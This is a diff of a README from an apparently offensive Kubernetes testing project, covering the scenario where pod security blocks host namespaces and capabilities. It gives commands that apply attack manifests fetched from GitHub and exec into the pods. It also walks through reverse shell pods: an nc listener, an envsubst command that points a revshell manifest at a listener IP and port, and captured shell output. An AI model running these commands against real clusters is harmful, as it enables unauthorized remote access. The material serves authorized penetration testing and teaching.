@@ -3,37 +3,58 @@
 The pod security policy or admission controller has blocked access to all of the host's namespaces and restricted all capabilities. **Do not despair**, especially if the target cluster is running in a cloud environment. 
 
 ## Table of Contents
-* [Pod Creation & Access](#Pod-Creation-&-Access)
-   * [Exec Pods](#exec-pods-create-one-or-more-of-these-resource-types-and-exec-into-the-pod)
-   * [Reverse Shell Pods](#reverse-shell-pods-Create-one-or-more-of-these-resources-and-catch-reverse-shell)
-   * [Deleting Resources](#Deleting-Resources)
-* [Post exploitation](#Post-exploitation)
+- [Pod creation & access](#pod-creation--access)
+  - [Exec pods](#exec-pods)
+  - [Reverse shell pods](#reverse-shell-pods)
+- [Post exploitation](#post-exploitation)
+- [Reference(s):](#references)
 
+# Pod creation & access
 
-# Pod Creation
-## Create a pod you can exec into
-Create pod
+## Exec pods
+Create one or more of these resource types and exec into the pod
+
+**Pod**  
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml 
-```
-Exec into pod 
-```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
 kubectl exec -it nothing-allowed-exec-pod -- bash
 ```
+**Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**
 
-## Reverse shell pod
+* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
 
-Set up listener
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/[RESOURCE_TYPE]/nothing-allowed-exec-[RESOURCE_TYPE].yaml 
+kubectl get pods | grep nothing-allowed-exec-[RESOURCE_TYPE]      
+kubectl exec -it nothing-allowed-exec-[RESOURCE_TYPE]-[ID] -- bash
+```
+
+*Keep in mind that if pod security policy blocks the pod, the resource type will still get created. The admission controller only blocks the pods that are created by the resource type.* 
+
+To troubleshoot a case where you don't see pods, use `kubectl describe`
+
+```
+kubectl describe nothing-allowed-exec-[RESOURCE_TYPE]
+```
+
+## Reverse shell pods
+Create one or more of these resources and catch the reverse shell
+
+**Step 1: Set up listener**
 ```bash
 nc -nvlp 3116
 ```
 
-Create pod from local manifest without modifying it by using env variables and envsubst
+**Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**
+
+* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+* Replace the HOST and PORT values to point the reverse shell to your listener
+* 
 ```bash
-HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/nothing-allowed/pod/nothing-allowed-revshell-pod.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/nothing-allowed/[RESOURCE_TYPE]/nothing-allowed-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
 ```
 
-Catch the shell
+**Step 3: Catch the shell**
 ```bash
 $ nc -nvlp 3116
 Listening on 0.0.0.0 3116
